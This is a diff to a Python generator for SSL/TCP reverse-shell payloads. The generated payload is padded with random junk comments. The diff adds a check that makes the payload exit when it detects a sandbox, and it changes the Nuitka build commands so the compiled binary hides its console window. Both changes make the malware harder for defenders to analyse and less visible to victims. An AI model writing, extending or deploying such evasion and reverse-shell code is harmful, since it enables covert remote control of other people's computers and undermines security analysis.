@@ -248,7 +248,11 @@ def gen_rev_ssl_tcp():
             a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(50)))
             ina.write('#'+a+'\n')
         b = '''
-
+from sandboxed import is_sandboxed
+import sys
+certainty = is_sandboxed(logging=False)
+if int(certainty)>0.5:
+    sys.exit()
 import zlib,base64,ssl,socket,struct,time
 
 for x in range(10):
@@ -382,11 +386,11 @@ def postgen():
     compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
     if compiling == 'y':
         if encrypted == True:
-            compcomd = 'python3 -m nuitka --standalone --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
+            compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
             os.system(compcomd)
             print('Saved under "dist" folder')
         else:
-            compcomd = 'python3 -m nuitka --standalone --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
+            compcomd = 'python3 -m nuitka --standalone --disable-console --include-module=sandboxed --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
             os.system(compcomd)
             os.system(clear)
             print(logo)
